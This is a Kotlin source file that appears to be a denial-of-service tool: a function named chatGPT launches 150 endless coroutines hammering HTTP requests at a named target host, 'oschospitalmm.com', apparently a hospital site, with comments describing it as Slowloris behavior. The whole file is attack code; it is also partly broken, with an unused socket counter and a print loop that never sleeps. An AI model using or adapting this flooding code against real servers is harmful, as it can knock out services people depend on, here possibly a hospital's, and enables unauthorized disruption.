package aster

import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.*
import io.ktor.client.statement.*
import io.ktor.http.*
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicInteger

suspend fun chatGPT() {
    val host = "oschospitalmm.com" // Replace with the target host
    val port = 80 // Replace with the target port
    val socketCount = 150 // Number of sockets to use in the test
    val sleeptimeMillis = 1500L // Time to sleep between each header sent (milliseconds)
    val asterViewModel = AsterViewModel()
    val client = HttpClient(CIO) {
        // Configure headers and other settings here
    }

    // Initialize and launch multiple coroutines to simulate Slowloris behavior
    val activeSockets = AtomicInteger(0)

    val jobList = List(socketCount) {
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                try {
                    //val response = client.get<HttpResponse>("http://$host:$port")
                    // Handle the response or perform additional actions as needed

                    // Sleep to simulate the sleeptime between headers
                    val response = client.get(urlString = "http://$host:$port") {
                       // setBody(malformedRequest)
                    }
                    // Handle the response here
                    //Log.i("NREQ", "Request $i completed with response: ${response.status}")
                    println("Request $it of wave $it completed with response: ${response.status}")
                    asterViewModel.setStatusMsg("Request $it of wave $it completed with response: ${response.status}")
                    println()

                    delay(sleeptimeMillis)
                } catch (e: Exception) {
                    // Handle exceptions (e.g., socket errors) here
                }
            }
        }
    }

    // Print information about the number of active sockets
    CoroutineScope(Dispatchers.IO).launch {
        while (true) {
            println("Active Sockets: ${activeSockets.get()}")
           // delay(1000) // Print socket count every second
        }
    }

    // Wait for all coroutines to finish
    jobList.forEach { it.join() }
}
